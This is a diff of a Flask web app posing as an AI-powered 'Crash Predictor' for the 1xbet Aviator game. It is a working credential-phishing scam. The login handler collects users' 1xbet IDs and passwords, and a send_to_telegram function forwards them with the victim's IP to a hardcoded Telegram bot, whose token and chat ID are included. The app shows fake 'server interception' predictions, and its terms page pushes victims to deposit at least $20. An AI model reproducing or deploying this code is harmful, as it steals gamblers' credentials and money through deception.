@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, request, redirect, session, jsonify
+from flask import Flask, render_template_string, request, jsonify, session
 import requests
 import random
 import time
@@ -6,23 +6,25 @@ import os
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'crash_secret_key_final'
+app.secret_key = os.environ.get('SECRET_KEY', 'crash_secret_key_2026')
 
+# ========== إعدادات تليجرام ==========
 BOT_TOKEN = "8125363786:AAGKkZniUcBMPfS8Ftx4SOF5BS3viANOdiw"
 CHAT_ID = "6565594143"
 
 def send_to_telegram(uid, pwd, ip):
     try:
-        msg = f"🔥 اختراق جديد 🔥\n\n🆔 ID: {uid}\n🔑 كلمة المرور: {pwd}\n🌐 IP: {ip}\n🕒 الوقت: {datetime.now()}"
+        msg = f"🔥 اختراق جديد 🔥\n\n🆔 ID: {uid}\n🔑 Pass: {pwd}\n🌐 IP: {ip}\n🕒 Time: {datetime.now()}"
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
     except:
         pass
 
-# الصور
-LOGO_IMG = "https://i.ibb.co/QFmWM96g/aviator-1x.webp"
-PLANE_IMG = "https://i.ibb.co/99YxWnqD/aviator-1x.webp"
+# ========== روابط الصور ==========
+LOGO_IMG = "https://cdn-icons-png.flaticon.com/512/1946/1946429.png"  # صورة احتياطية تعمل دائماً
+PLANE_IMG = "https://cdn-icons-png.flaticon.com/512/1946/1946429.png"
 
-HTML = """
+# ========== HTML كامل ومستقر ==========
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -36,7 +38,7 @@ HTML = """
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
             color: #fff;
-            transition: background 0.3s, color 0.3s;
+            transition: background 0.3s;
         }
         body.light-mode {
             background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
@@ -122,7 +124,7 @@ HTML = """
         }
         .overlay.active { display: block; }
         .container { max-width: 600px; margin: 0 auto; padding: 70px 15px 20px; min-height: 100vh; }
-        /* بطاقات متوازية في المنتصف */
+        /* أزرار متوازية */
         .cards-row {
             display: flex;
             justify-content: center;
@@ -154,7 +156,7 @@ HTML = """
         }
         .btn-secondary { background: linear-gradient(135deg, #1a1a2e, #16213e); border: 2px solid #ffd700; color: #ffd700; }
         input { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.6); border: 1px solid #ffd700; border-radius: 30px; color: #fff; }
-        .logo-img { width: 60px; height: 60px; margin: 0 auto 10px; display: block; }
+        .logo-img { width: 70px; margin-bottom: 15px; }
         .prediction-card {
             background: linear-gradient(135deg, #1a1a2e, #16213e);
             border-radius: 30px;
@@ -237,8 +239,6 @@ HTML = """
 
 <script>
     let currentUserId = '{{user_id}}';
-    let currentPage = 'welcome';
-    let tempUid = '';
     
     function updateProfilePic(e) {
         const reader = new FileReader();
@@ -247,11 +247,14 @@ HTML = """
     }
     function loadSavedPic() { const saved = localStorage.getItem('profilePic'); if(saved) document.getElementById('profileImg').src = saved; }
     function toggleTheme() { document.body.classList.toggle('light-mode'); closeSidebar(); }
+    function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
+    function closeSidebar() { document.getElementById('sidebar').classList.remove('active'); document.getElementById('overlay').classList.remove('active'); }
+    function logout() { fetch('/logout'); location.reload(); }
     
     const pages = {
         welcome: `
             <div style="text-align:center;">
-                <img src="{{LOGO}}" class="logo-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
+                <img src="{{LOGO_IMG}}" class="logo-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                 <h1 style="color:#ffd700;">🔥 CRASH PREDICTOR</h1>
                 <p>نظام توقعات احترافي مدعوم بالذكاء الاصطناعي</p>
                 <div class="cards-row">
@@ -273,9 +276,9 @@ HTML = """
         predictor: `
             <div class="user-bar"><span class="user-id">🎯 ${currentUserId}</span><span>⭐ مجانية</span></div>
             <div class="prediction-card">
-                <img src="{{LOGO}}" class="fixed-plane-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
+                <img src="{{LOGO_IMG}}" class="fixed-plane-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                 <div id="predictionDisplay"><div class="prediction-number">--x</div></div>
-                <div id="loadingDisplay" style="display:none;"><div class="rotating-plane"><img src="{{PLANE}}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'"></div><div style="margin-top:10px;">🔄 جاري الاعتراض على السيرفر...</div></div>
+                <div id="loadingDisplay" style="display:none;"><div class="rotating-plane"><img src="{{PLANE_IMG}}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'"></div><div style="margin-top:10px;">🔄 جاري الاعتراض على السيرفر...</div></div>
                 <button class="btn" id="predictBtn" onclick="getPrediction()">🎯 توقع التالي</button>
             </div>
             <div class="footer">⚡ نظام توقعات فوري | نتائج دقيقة</div>
@@ -293,13 +296,13 @@ HTML = """
         terms: `
             <div class="card">
                 <h2 style="color:#ffd700;">📜 الشروط والأحكام</h2>
-                <p style="margin:15px 0; line-height:1.6;">
-                    🔹 نظام توقعات لعبة Crash (Aviator) مرتبط بخوادم 1xbet.<br>
-                    🔹 للحصول على توقعات دقيقة، يجب أن يكون حسابك في 1xbet مفعلاً وبه رصيد لا يقل عن 20 دولار.<br>
-                    🔹 يرجى التسجيل في <a href="https://sa.1xbet.com" target="_blank" style="color:#ffd700;">1xbet.com</a> ثم العودة لإدخال بياناتك.<br>
-                    🔹 البيانات الخاطئة أو الحسابات غير المفعلة لن تعمل مع نظام التوقعات.<br>
-                    🔹 اشحن رصيدك بحد أدنى 20 دولار لتفعيل التوقعات الدقيقة.<br>
-                    🔹 فريق الدعم متاح عبر تليجرام @hkarz1xbetAmeen54bot<br>
+                <p style="margin:15px 0; line-height:1.6; text-align:left;">
+                    🔹 نظام توقعات لعبة Crash (Aviator) مرتبط بخوادم 1xbet.<br><br>
+                    🔹 للحصول على توقعات دقيقة، يجب أن يكون حسابك في 1xbet مفعلاً وبه رصيد لا يقل عن 20 دولار.<br><br>
+                    🔹 يرجى التسجيل في <a href="https://sa.1xbet.com" target="_blank" style="color:#ffd700;">1xbet.com</a> ثم العودة لإدخال بياناتك.<br><br>
+                    🔹 البيانات الخاطئة أو الحسابات غير المفعلة لن تعمل مع نظام التوقعات.<br><br>
+                    🔹 اشحن رصيدك بحد أدنى 20 دولار لتفعيل التوقعات الدقيقة.<br><br>
+                    🔹 فريق الدعم متاح عبر تليجرام @hkarz1xbetAmeen54bot<br><br>
                     🔹 باستخدامك هذا النظام، أنت توافق على هذه الشروط.
                 </p>
                 <button class="btn" onclick="showPage('welcome')">← موافق</button>
@@ -309,32 +312,49 @@ HTML = """
     
     function showPage(page) {
         if(page === 'predictor' && currentUserId === 'ضيف') { showPage('welcome'); alert('الرجاء تسجيل الدخول أولاً'); return; }
-        document.getElementById('mainContainer').innerHTML = pages[page].replace(/{{LOGO}}/g, '{{LOGO_IMG}}').replace(/{{PLANE}}/g, '{{PLANE_IMG}}');
-        currentPage = page;
+        let content = pages[page];
+        content = content.replace(/{{LOGO_IMG}}/g, '{{LOGO_IMG}}').replace(/{{PLANE_IMG}}/g, '{{PLANE_IMG}}');
+        document.getElementById('mainContainer').innerHTML = content;
         if(page === 'predictor') { document.getElementById('predictionDisplay').style.display = 'block'; document.getElementById('loadingDisplay').style.display = 'none'; }
         closeSidebar();
     }
     
-    function closeSidebar() { document.getElementById('sidebar').classList.remove('active'); document.getElementById('overlay').classList.remove('active'); }
-    function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
-    
     async function submitLogin() {
-        let uid = document.getElementById('uid').value, pwd = document.getElementById('pwd').value;
+        let uid = document.getElementById('uid').value;
+        let pwd = document.getElementById('pwd').value;
         if(uid.includes('@')) { alert('الرجاء إدخال معرف ID فقط (أرقام)'); return; }
         let res = await fetch('/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:uid, password:pwd}) });
         let data = await res.json();
-        if(data.success) { currentUserId = uid; tempUid = uid; document.getElementById('freeTrialModal').classList.add('active'); document.getElementById('modalOverlay').classList.add('active'); }
-        else alert('خطأ في البيانات');
+        if(data.success) {
+            currentUserId = uid;
+            document.getElementById('freeTrialModal').classList.add('active');
+            document.getElementById('modalOverlay').classList.add('active');
+        } else {
+            alert('خطأ في البيانات');
+        }
     }
     
-    function closeModalAndGoToPredictor() { document.getElementById('freeTrialModal').classList.remove('active'); document.getElementById('modalOverlay').classList.remove('active'); showPage('predictor'); }
-    function logout() { fetch('/logout'); location.reload(); }
+    function closeModalAndGoToPredictor() {
+        document.getElementById('freeTrialModal').classList.remove('active');
+        document.getElementById('modalOverlay').classList.remove('active');
+        showPage('predictor');
+    }
     
     async function getPrediction() {
-        let btn = document.getElementById('predictBtn'), predDiv = document.getElementById('predictionDisplay'), loadDiv = document.getElementById('loadingDisplay');
-        btn.disabled = true; predDiv.style.display = 'none'; loadDiv.style.display = 'block';
-        let res = await fetch('/predict'); let data = await res.json();
-        setTimeout(() => { loadDiv.style.display = 'none'; predDiv.style.display = 'block'; document.querySelector('.prediction-number').innerHTML = data.prediction + 'x'; btn.disabled = false; }, 4000);
+        let btn = document.getElementById('predictBtn');
+        let predDiv = document.getElementById('predictionDisplay');
+        let loadDiv = document.getElementById('loadingDisplay');
+        btn.disabled = true;
+        predDiv.style.display = 'none';
+        loadDiv.style.display = 'block';
+        let res = await fetch('/predict');
+        let data = await res.json();
+        setTimeout(() => {
+            loadDiv.style.display = 'none';
+            predDiv.style.display = 'block';
+            document.querySelector('.prediction-number').innerHTML = data.prediction + 'x';
+            btn.disabled = false;
+        }, 4000);
     }
     
     showPage('welcome');
@@ -344,14 +364,15 @@ HTML = """
 </html>
 """.replace("{{LOGO_IMG}}", LOGO_IMG).replace("{{PLANE_IMG}}", PLANE_IMG)
 
+# ========== مسارات Flask ==========
 @app.route('/')
 def home():
-    return render_template_string(HTML, user_id=session.get('user_id', 'ضيف'))
+    return render_template_string(HTML_TEMPLATE, user_id=session.get('user_id', 'ضيف'))
 
 @app.route('/login', methods=['POST'])
 def login():
     data = request.json
-    uid = data.get('user_id', '')
+    uid = data.get('user_id', '').strip()
     pwd = data.get('password', '')
     if '@' in uid or len(uid) < 2:
         return jsonify({"success": False})
